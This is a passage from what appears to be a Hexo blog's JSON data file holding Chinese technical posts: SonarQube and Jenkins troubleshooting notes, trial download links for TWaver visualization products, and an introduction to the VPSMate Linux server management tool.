Plugins&#x4E0B;&#x5B89;&#x88C5;&#x6C49;&#x5316;&#x5305;&#xFF0C;&#x5E76;&#x91CD;&#x65B0;&#x542F;&#x52A8;Sonar&#x3002;<br><strong>&#x6CE8;&#x610F;&#xFF1A;</strong>&#x5F53;&#x67D0;&#x4E9B;&#x63D2;&#x4EF6;&#x603B;&#x662F;&#x4E0B;&#x8F7D;&#x5931;&#x8D25;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x641C;&#x7D22;&#x63D2;&#x4EF6;&#x540D;&#x624B;&#x52A8;&#x4E0B;&#x8F7D;&#xFF0C;&#x5E76;&#x5728;&#x3010;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x2013;&#x7BA1;&#x7406;&#x63D2;&#x4EF6;&#x2013;&#x9AD8;&#x7EA7;&#x2013;&#x6D4F;&#x89C8;-&#x4E0A;&#x4F20;&#x63D2;&#x4EF6;&#x3011;&#x4E2D;&#x4E0A;&#x4F20;&#x63D2;&#x4EF6;&#x5373;&#x53EF;&#x3002;</p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Jenkins&#x96C6;&#x6210;Sonar&#x540E;&#xFF0C;Sonar&#x65E0;&#x6CD5;&#x626B;&#x63CF;Java&#x8BED;&#x8A00;&#x4EE3;&#x7801;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x5728;Sonar&#x7684;Settings/SYSTEM/Update Center/Available&#x76EE;&#x5F55;&#x4E0B;&#x4E0B;&#x8F7D;Java&#x8BED;&#x8A00;&#x5305;&#xFF0C;&#x5E76;&#x91CD;&#x65B0;&#x542F;&#x52A8;Jenkins&#x548C;Sonar&#x3002;Jenkins&#x4F1A;&#x6839;&#x636E;&#x914D;&#x7F6E;&#x7684;&#x626B;&#x63CF;&#x8DEF;&#x5F84;&#xFF0C;&#x5B9A;&#x65F6;&#x626B;&#x63CF;&#x76F8;&#x5173;&#x4EE3;&#x7801;&#xFF0C;&#x5E76;&#x5728;Sonar&#x4E2D;&#x53EF;&#x89C6;&#x5316;&#x3002;<br><strong>&#x6CE8;&#x610F;&#xFF1A;</strong>SonarQube&#x96C6;&#x6210;Java&#x63D2;&#x4EF6;&#x5B98;&#x65B9;&#x5730;&#x5740;&#xFF1A;<a href=\"http://docs.sonarqube.org/display/PLUG/Java+Plugin\">http://docs.sonarqube.org/display/PLUG/Java+Plugin</a></p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;&#x4E0B;&#x8F7D;&#x67D0;&#x8BED;&#x8A00;&#x5305;&#x540E;&#xFF0C;Sonar&#x91CD;&#x542F;&#x4ECD;&#x7136;&#x65E0;&#x6CD5;&#x626B;&#x63CF;&#x76F8;&#x5173;&#x4EE3;&#x7801;</strong><br><strong>&#x539F;&#x56E0;&#xFF1A;</strong>&#x5982;&#x4E0B;&#x8F7D;&#x201D;C/C++/Objective-c&#x201D;&#x8FD9;&#x4E2A;&#x63D2;&#x4EF6;&#x540E;&#xFF0C;&#x91CD;&#x65B0;&#x542F;&#x52A8;&#x626B;&#x63CF;C&#x4EE3;&#x7801;&#x603B;&#x662F;&#x62A5;&#x9519;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Caused by: org.sonar.api.utils.SonarException: No license <span class=\"keyword\">for</span> cpp</span><br></pre></td></tr></table></figure></p>\n<p>&#x539F;&#x4EE5;&#x4E3A;&#x662F;&#x9700;&#x8981;&#x5B89;&#x88C5;cpp&#x63D2;&#x4EF6;&#xFF0C;&#x540E;&#x6765;&#x624D;&#x53D1;&#x73B0;&#x91CD;&#x70B9;&#x662F;No license&#xFF0C;&#x610F;&#x601D;&#x5C31;&#x662F;&#x9700;&#x8981;&#x4ED8;&#x8D39;&#x8D2D;&#x4E70;&#x8BB8;&#x53EF;&#x8BC1;&#x3002;<br>&#x7F51;&#x4E0A;&#x641C;&#x7D22;&#x514D;&#x8D39;&#x8BB8;&#x53EF;&#x8BC1;&#x65E0;&#x679C;&#xFF0C;&#x7136;&#x540E;&#x70B9;&#x51FB;&#x201D;Get trial key&#x201D;, &#x7ED3;&#x679C;&#x7ACB;&#x9A6C;&#x6536;&#x5230;&#x5B98;&#x65B9;&#x90AE;&#x4EF6;&#x56DE;&#x590D;&#x88AB;&#x62D2;&#xFF0C;&#x7EC8;&#x653E;&#x5F03;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/3.png\" alt=\"&#x56FE;&#x7247;3\"></p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Jenkins&#x96C6;&#x6210;Sonar&#x540E;&#xFF0C;Jenkins&#x81EA;&#x52A8;&#x5316;&#x811A;&#x672C;&#x6267;&#x884C;&#x5931;&#x8D25;&#xFF0C;&#x5E76;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong>&#x66F4;&#x6362;&#x63D2;&#x4EF6;&#x7248;&#x672C;&#x5373;&#x53EF;&#xFF0C;&#x4E0B;&#x6B21;&#x5B89;&#x88C5;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x3002;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/4.png\" alt=\"&#x56FE;&#x7247;4\"></p>\n<p><strong>&#x95EE;&#x9898;&#xFF1A;Jenkins&#x8D26;&#x6237;&#x6743;&#x9650;&#x5982;&#x4F55;&#x5206;&#x914D;</strong><br><strong>&#x65B9;&#x6848;&#xFF1A;</strong> &#x76F8;&#x5173;&#x94FE;&#x63A5;&#xFF1A;<a href=\"http://www.360doc.com/content/13/0802/14/7811581_304255550.shtml\">http://www.360doc.com/content/13/0802/14/7811581_304255550.shtml</a><br><strong>&#x6CE8;&#x610F;&#xFF1A;</strong> &#x5982;&#x679C;&#x7528;admin&#x8D26;&#x6237;&#x767B;&#x5F55;&#xFF0C;&#x5728;&#x5206;&#x914D;&#x6743;&#x9650;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C06;admin&#x6743;&#x9650;&#x5168;&#x90E8;&#x7F6E;&#x7A7A;&#xFF0C;&#x4E00;&#x65E6;&#x9000;&#x51FA;&#xFF0C;&#x5C06;&#x65E0;&#x6CD5;&#x4F7F;&#x7528; 0.0&#xFF01;&#x6211;&#x5F53;&#x521D;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x662F;&#x4FEE;&#x6539;&#x8FDC;&#x7A0B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x5982;&#x679C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E00;&#x65E6;&#x6539;&#x4E71;&#xFF0C;&#x5C31;&#x53EA;&#x80FD;&#x91CD;&#x88C5;&#x4E86;&#x3002;</p>\n<h3 id=\"&#x8FD0;&#x884C;&#x7ED3;&#x679C;\"><a href=\"#&#x8FD0;&#x884C;&#x7ED3;&#x679C;\" class=\"headerlink\" title=\"&#x8FD0;&#x884C;&#x7ED3;&#x679C;\"></a>&#x8FD0;&#x884C;&#x7ED3;&#x679C;</h3><p><strong>Sonar&#x6210;&#x529F;&#x8FD0;&#x884C;&#x5982;&#x56FE;&#x4E94;&#x56FE;&#x516D;&#x6240;&#x793A;&#xFF0C;&#x5176;&#x4E2D;&#x4EE3;&#x7801;&#x68C0;&#x6D4B;&#x89C4;&#x5219;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x4E5F;&#x53EF;&#x4EE5;&#x81EA;&#x5B9A;&#x4E49;&#xFF0C;&#x5BF9;&#x4E8E;&#x56FE;&#x516D;&#x663E;&#x793A;&#x51FA;&#x7684;&#x5177;&#x4F53;&#x9519;&#x8BEF;&#xFF0C;Sonar&#x4E5F;&#x53EF;&#x5728;&#x9875;&#x9762;&#x76F4;&#x63A5;&#x5206;&#x914D;&#x7ED9;&#x67D0;&#x4E2A;&#x7EC4;&#x5458;&#x4FEE;&#x6539;</strong></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/5.png\" alt=\"&#x56FE;&#x7247;5\"><br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/SonarQube+Jenkins,%E6%90%AD%E5%BB%BA%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98%E5%B9%B3%E5%8F%B0/6.png\" alt=\"&#x56FE;&#x7247;6\"></p>\n<p><br></p>"},{"title":"TWaver 2D+GIS+3D的试用和在线Demo","date":"2016-05-10T13:18:00.000Z","toc":false,"_content":"\nTWaver 2D for HTML5试用下载：\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-5.4.7.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-5.4.7.zip)\n\nTWaver GIS for HTML5试用下载：\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-html5-5.4.7.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-html5-5.4.7.zip)\n\nTWaver 3D for HTML5试用下载：\n各种在线3D Demo：\n[http://idc.servasoft.com:8081/twaver-html5-3d/](http://idc.servasoft.com:8081/twaver-html5-3d/)\n**三维机房、变电站、会议室等都在里面。**\n\nTWaver 3D for HTML5（SDK/引擎）的试用下载（这个里面有上面在线demo的源代码）\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-3d-2.2.0.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-3d-2.2.0.zip)\n文档\n[http://doc.servasoft.com/twaver-document-center/twaver-html5-3d-v2/](http://doc.servasoft.com/twaver-document-center/twaver-html5-3d-v2/)\n\nTWaver Make（模型库）的下载链接和文档：\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-make-1.4.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-make-1.4.zip)\n文档\n[http://doc.servasoft.com/twaver-document-center/twaver-make/](http://doc.servasoft.com/twaver-document-center/twaver-make/)\n\nTWaver Doodle（编辑器）的下载：\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-doodle-1.4.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-doodle-1.4.zip)\n文档\n[http://doc.servasoft.com/twaver-document-center/twaver-doodle/](http://doc.servasoft.com/twaver-document-center/twaver-doodle/)\n\nTWaver 2D for Java试用下载：\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-java-4.6.3.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-java-4.6.3.zip)\n\nTWaver GIS for Java试用下载：\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-java-4.5.6.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-java-4.5.6.zip)\n\n![示例图片](http://7xvfir.com1.z0.glb.clouddn.com/TWaver%202D+GIS+3D%E7%9A%84%E8%AF%95%E7%94%A8%E5%92%8C%E5%9C%A8%E7%BA%BFDemo/1.png)","source":"_posts/TWaver 2D+GIS+3D的试用和在线Demo.md","raw":"---\ntitle: TWaver 2D+GIS+3D的试用和在线Demo\ncategories:\n  - 其他技术\ndate: 2016-5-10 21:18:00\ntoc: false\n---\n\nTWaver 2D for HTML5试用下载：\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-5.4.7.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-5.4.7.zip)\n\nTWaver GIS for HTML5试用下载：\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-html5-5.4.7.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-html5-5.4.7.zip)\n\nTWaver 3D for HTML5试用下载：\n各种在线3D Demo：\n[http://idc.servasoft.com:8081/twaver-html5-3d/](http://idc.servasoft.com:8081/twaver-html5-3d/)\n**三维机房、变电站、会议室等都在里面。**\n\nTWaver 3D for HTML5（SDK/引擎）的试用下载（这个里面有上面在线demo的源代码）\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-3d-2.2.0.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-3d-2.2.0.zip)\n文档\n[http://doc.servasoft.com/twaver-document-center/twaver-html5-3d-v2/](http://doc.servasoft.com/twaver-document-center/twaver-html5-3d-v2/)\n\nTWaver Make（模型库）的下载链接和文档：\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-make-1.4.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-make-1.4.zip)\n文档\n[http://doc.servasoft.com/twaver-document-center/twaver-make/](http://doc.servasoft.com/twaver-document-center/twaver-make/)\n\nTWaver Doodle（编辑器）的下载：\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-doodle-1.4.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-doodle-1.4.zip)\n文档\n[http://doc.servasoft.com/twaver-document-center/twaver-doodle/](http://doc.servasoft.com/twaver-document-center/twaver-doodle/)\n\nTWaver 2D for Java试用下载：\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-java-4.6.3.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-java-4.6.3.zip)\n\nTWaver GIS for Java试用下载：\n[http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-java-4.5.6.zip](http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-java-4.5.6.zip)\n\n![示例图片](http://7xvfir.com1.z0.glb.clouddn.com/TWaver%202D+GIS+3D%E7%9A%84%E8%AF%95%E7%94%A8%E5%92%8C%E5%9C%A8%E7%BA%BFDemo/1.png)","slug":"TWaver 2D+GIS+3D的试用和在线Demo","published":1,"updated":"2016-11-17T11:59:42.671Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulch002jgwtm0kp2w0bp","content":"<p>TWaver 2D for HTML5&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-5.4.7.zip\" target=\"_blank\" rel=\"external\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-5.4.7.zip</a></p>\n<p>TWaver GIS for HTML5&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-html5-5.4.7.zip\" target=\"_blank\" rel=\"external\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-html5-5.4.7.zip</a></p>\n<p>TWaver 3D for HTML5&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;<br>&#x5404;&#x79CD;&#x5728;&#x7EBF;3D Demo&#xFF1A;<br><a href=\"http://idc.servasoft.com:8081/twaver-html5-3d/\" target=\"_blank\" rel=\"external\">http://idc.servasoft.com:8081/twaver-html5-3d/</a><br><strong>&#x4E09;&#x7EF4;&#x673A;&#x623F;&#x3001;&#x53D8;&#x7535;&#x7AD9;&#x3001;&#x4F1A;&#x8BAE;&#x5BA4;&#x7B49;&#x90FD;&#x5728;&#x91CC;&#x9762;&#x3002;</strong></p>\n<p>TWaver 3D for HTML5&#xFF08;SDK/&#x5F15;&#x64CE;&#xFF09;&#x7684;&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF08;&#x8FD9;&#x4E2A;&#x91CC;&#x9762;&#x6709;&#x4E0A;&#x9762;&#x5728;&#x7EBF;demo&#x7684;&#x6E90;&#x4EE3;&#x7801;&#xFF09;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-3d-2.2.0.zip\" target=\"_blank\" rel=\"external\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-3d-2.2.0.zip</a><br>&#x6587;&#x6863;<br><a href=\"http://doc.servasoft.com/twaver-document-center/twaver-html5-3d-v2/\" target=\"_blank\" rel=\"external\">http://doc.servasoft.com/twaver-document-center/twaver-html5-3d-v2/</a></p>\n<p>TWaver Make&#xFF08;&#x6A21;&#x578B;&#x5E93;&#xFF09;&#x7684;&#x4E0B;&#x8F7D;&#x94FE;&#x63A5;&#x548C;&#x6587;&#x6863;&#xFF1A;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-make-1.4.zip\" target=\"_blank\" rel=\"external\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-make-1.4.zip</a><br>&#x6587;&#x6863;<br><a href=\"http://doc.servasoft.com/twaver-document-center/twaver-make/\" target=\"_blank\" rel=\"external\">http://doc.servasoft.com/twaver-document-center/twaver-make/</a></p>\n<p>TWaver Doodle&#xFF08;&#x7F16;&#x8F91;&#x5668;&#xFF09;&#x7684;&#x4E0B;&#x8F7D;&#xFF1A;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-doodle-1.4.zip\" target=\"_blank\" rel=\"external\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-doodle-1.4.zip</a><br>&#x6587;&#x6863;<br><a href=\"http://doc.servasoft.com/twaver-document-center/twaver-doodle/\" target=\"_blank\" rel=\"external\">http://doc.servasoft.com/twaver-document-center/twaver-doodle/</a></p>\n<p>TWaver 2D for Java&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-java-4.6.3.zip\" target=\"_blank\" rel=\"external\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-java-4.6.3.zip</a></p>\n<p>TWaver GIS for Java&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-java-4.5.6.zip\" target=\"_blank\" rel=\"external\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-java-4.5.6.zip</a></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TWaver%202D+GIS+3D%E7%9A%84%E8%AF%95%E7%94%A8%E5%92%8C%E5%9C%A8%E7%BA%BFDemo/1.png\" alt=\"&#x793A;&#x4F8B;&#x56FE;&#x7247;\"></p>\n","excerpt":"","more":"<p>TWaver 2D for HTML5&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-5.4.7.zip\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-5.4.7.zip</a></p>\n<p>TWaver GIS for HTML5&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-html5-5.4.7.zip\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-html5-5.4.7.zip</a></p>\n<p>TWaver 3D for HTML5&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;<br>&#x5404;&#x79CD;&#x5728;&#x7EBF;3D Demo&#xFF1A;<br><a href=\"http://idc.servasoft.com:8081/twaver-html5-3d/\">http://idc.servasoft.com:8081/twaver-html5-3d/</a><br><strong>&#x4E09;&#x7EF4;&#x673A;&#x623F;&#x3001;&#x53D8;&#x7535;&#x7AD9;&#x3001;&#x4F1A;&#x8BAE;&#x5BA4;&#x7B49;&#x90FD;&#x5728;&#x91CC;&#x9762;&#x3002;</strong></p>\n<p>TWaver 3D for HTML5&#xFF08;SDK/&#x5F15;&#x64CE;&#xFF09;&#x7684;&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF08;&#x8FD9;&#x4E2A;&#x91CC;&#x9762;&#x6709;&#x4E0A;&#x9762;&#x5728;&#x7EBF;demo&#x7684;&#x6E90;&#x4EE3;&#x7801;&#xFF09;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-3d-2.2.0.zip\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-html5-3d-2.2.0.zip</a><br>&#x6587;&#x6863;<br><a href=\"http://doc.servasoft.com/twaver-document-center/twaver-html5-3d-v2/\">http://doc.servasoft.com/twaver-document-center/twaver-html5-3d-v2/</a></p>\n<p>TWaver Make&#xFF08;&#x6A21;&#x578B;&#x5E93;&#xFF09;&#x7684;&#x4E0B;&#x8F7D;&#x94FE;&#x63A5;&#x548C;&#x6587;&#x6863;&#xFF1A;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-make-1.4.zip\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-make-1.4.zip</a><br>&#x6587;&#x6863;<br><a href=\"http://doc.servasoft.com/twaver-document-center/twaver-make/\">http://doc.servasoft.com/twaver-document-center/twaver-make/</a></p>\n<p>TWaver Doodle&#xFF08;&#x7F16;&#x8F91;&#x5668;&#xFF09;&#x7684;&#x4E0B;&#x8F7D;&#xFF1A;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-doodle-1.4.zip\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-doodle-1.4.zip</a><br>&#x6587;&#x6863;<br><a href=\"http://doc.servasoft.com/twaver-document-center/twaver-doodle/\">http://doc.servasoft.com/twaver-document-center/twaver-doodle/</a></p>\n<p>TWaver 2D for Java&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-java-4.6.3.zip\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twaver-java-4.6.3.zip</a></p>\n<p>TWaver GIS for Java&#x8BD5;&#x7528;&#x4E0B;&#x8F7D;&#xFF1A;<br><a href=\"http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-java-4.5.6.zip\">http://download.servasoft.com/dl/twaver/sssyuwyeriUR/k/twavergis-java-4.5.6.zip</a></p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/TWaver%202D+GIS+3D%E7%9A%84%E8%AF%95%E7%94%A8%E5%92%8C%E5%9C%A8%E7%BA%BFDemo/1.png\" alt=\"&#x793A;&#x4F8B;&#x56FE;&#x7247;\"></p>\n"},{"title":"VPSMate","date":"2016-08-30T10:24:17.000Z","toc":false,"_content":"\n### VPSMate特性\n最近发现了一个Linux服务器WEB管理工具，挺不错的，有如下性能：\n\n- 快速在线安装、小巧且节省资源\n\n- 当前支持 CentOS/Redhat 5.4+、6.x\n\n- 基于发行版软件源的软件管理机制\n\n- 轻松构建 Linux + Nginx + MySQL + PHP 环境\n\n- 强大的在线文件管理和回收站机制\n\n- 快速创建和安装多种站点\n\n- 丰富实用的系统工具\n\n### VPSMate官网\n[http://www.vpsmate.org/](http://www.vpsmate.org/)\n\n### 核心安装文件\ninstall.py 下载地址\n[http://pan.baidu.com/s/1eSgFpIU](http://pan.baidu.com/s/1eSgFpIU) 密码：yaju","source":"_posts/VPSMate.md","raw":"---\ntitle: VPSMate\ncategories:\n  - 运维部署\ndate: 2016-8-30 18:24:17\ntags:\n  - VPSMate\ntoc: false\n---\n\n### VPSMate特性\n最近发现了一个Linux服务器WEB管理工具，挺不错的，有如下性能：\n\n- 快速在线安装、小巧且节省资源\n\n- 当前支持 CentOS/Redhat 5.4+、6.x\n\n- 基于发行版软件源的软件管理机制\n\n- 轻松构建 Linux + Nginx + MySQL + PHP 环境\n\n- 强大的在线文件管理和回收站机制\n\n- 快速创建和安装多种站点\n\n- 丰富实用的系统工具\n\n### VPSMate官网\n[http://www.vpsmate.org/](http://www.vpsmate.org/)\n\n### 核心安装文件\ninstall.py 下载地址\n[http://pan.baidu.com/s/1eSgFpIU](http://pan.baidu.com/s/1eSgFpIU) 密码：yaju","slug":"VPSMate","published":1,"updated":"2016-11-17T11:59:42.671Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulcj002mgwtmx0me9x39","content":"<h3 id=\"VPSMate&#x7279;&#x6027;\"><a href=\"#VPSMate&#x7279;&#x6027;\" class=\"headerlink\" title=\"VPSMate&#x7279;&#x6027;\"></a>VPSMate&#x7279;&#x6027;</h3><p>&#x6700;&#x8FD1;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;Linux&#x670D;&#x52A1;&#x5668;WEB&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#xFF0C;&#x633A;&#x4E0D;&#x9519;&#x7684;&#xFF0C;&#x6709;&#x5982;&#x4E0B;&#x6027;&#x80FD;&#xFF1A;</p>\n<ul>\n<li><p>&#x5FEB;&#x901F;&#x5728;&#x7EBF;&#x5B89;&#x88C5;&#x3001;&#x5C0F;&#x5DE7;&#x4E14;&#x8282;&#x7701;&#x8D44;&#x6E90;</p>\n</li>\n<li><p>&#x5F53;&#x524D;&#x652F;&#x6301; CentOS/Redhat 5.4+&#x3001;6.x</p>\n</li>\n<li><p>&#x57FA;&#x4E8E;&#x53D1;&#x884C;&#x7248;&#x8F6F;&#x4EF6;&#x6E90;&#x7684;&#x8F6F;&#x4EF6;&#x7BA1;&#x7406;&#x673A;&#x5236;</p>\n</li>\n<li><p>&#x8F7B;&#x677E;&#x6784;&#x5EFA; Linux + Nginx + MySQL + PHP &#x73AF;&#x5883;</p>\n</li>\n<li><p>&#x5F3A;&#x5927;&#x7684;&#x5728;&#x7EBF;&#x6587;&#x4EF6;&#x7BA1;&#x7406;&#x548C;&#x56DE;&#x6536;&#x7AD9;&#x673A;&#x5236;</p>\n</li>\n<li><p>&#x5FEB;&#x901F;&#x521B;&#x5EFA;&#x548C;&#x5B89;&#x88C5;&#x591A;&#x79CD;&#x7AD9;&#x70B9;</p>\n</li>\n<li><p>&#x4E30;&#x5BCC;&#x5B9E;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x5DE5;&#x5177;</p>\n</li>\n</ul>\n<h3 id=\"VPSMate&#x5B98;&#x7F51;\"><a href=\"#VPSMate&#x5B98;&#x7F51;\" class=\"headerlink\" title=\"VPSMate&#x5B98;&#x7F51;\"></a>VPSMate&#x5B98;&#x7F51;</h3><p><a href=\"http://www.vpsmate.org/\" target=\"_blank\" rel=\"external\">http://www.vpsmate.org/</a></p>\n<h3 id=\"&#x6838;&#x5FC3;&#x5B89;&#x88C5;&#x6587;&#x4EF6;\"><a href=\"#&#x6838;&#x5FC3;&#x5B89;&#x88C5;&#x6587;&#x4EF6;\" class=\"headerlink\" title=\"&#x6838;&#x5FC3;&#x5B89;&#x88C5;&#x6587;&#x4EF6;\"></a>&#x6838;&#x5FC3;&#x5B89;&#x88C5;&#x6587;&#x4EF6;</h3><p>install.py &#x4E0B;&#x8F7D;&#x5730;&#x5740;<br><a href=\"http://pan.baidu.com/s/1eSgFpIU\" target=\"_blank\" rel=\"external\">http://pan.baidu.com/s/1eSgFpIU</a> &#x5BC6;&#x7801;&#xFF1A;yaju</p>\n","excerpt":"","more":"<h3 id=\"VPSMate&#x7279;&#x6027;\"><a href=\"#VPSMate&#x7279;&#x6027;\" class=\"headerlink\" title=\"VPSMate&#x7279;&#x6027;\"></a>VPSMate&#x7279;&#x6027;</h3><p>&#x6700;&#x8FD1;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;Linux&#x670D;&#x52A1;&#x5668;WEB&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#xFF0C;&#x633A;&#x4E0D;&#x9519;&#x7684;&#xFF0C;&#x6709;&#x5982;&#x4E0B;&#x6027;&#x80FD;&#xFF1A;</p>\n<ul>\n<li><p>&#x5FEB;&#x901F;&#x5728;&#x7EBF;&#x5B89;&#x88C5;&#x3001;&#x5C0F;&#x5DE7;&#x4E14;&#x8282;&#x7701;&#x8D44;&#x6E90;</p>\n</li>\n<li><p>&#x5F53;&#x524D;&#x652F;&#x6301; CentOS/Redhat 5.4+&#x3001;6.x</p>\n</li>\n<li><p>&#x57FA;&#x4E8E;&#x53D1;&#x884C;&#x7248;&#x8F6F;&#x4EF6;&#x6E90;&#x7684;&#x8F6F;&#x4EF6;&#x7BA1;&#x7406;&#x673A;&#x5236;</p>\n</li>\n<li><p>&#x8F7B;&#x677E;&#x6784;&#x5EFA; Linux + Nginx + MySQL + PHP &#x73AF;&#x5883;</p>\n</li>\n<li><p>&#x5F3A;&#x5927;&#x7684;&#x5728;&#x7EBF;&#x6587;&#x4EF6;&#x7BA1;&#x7406;&#x548C;&#x56DE;&#x6536;&#x7AD9;&#x673A;&#x5236;</p>\n</li>\n<li><p>&#x5FEB;&#x901F;&#x521B;&#x5EFA;&#x548C;&#x5B89;&#x88C5;&#x591A;&#x79CD;&#x7AD9;&#x70B9;</p>\n</li>\n<li><p>&#x4E30;&#x5BCC;&#x5B9E;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x5DE5;&#x5177;</p>\n</li>\n</ul>\n<h3 id=\"VPSMate&#x5B98;&#x7F51;\"><a href=\"#VPSMate&#x5B98;&#x7F51;\" 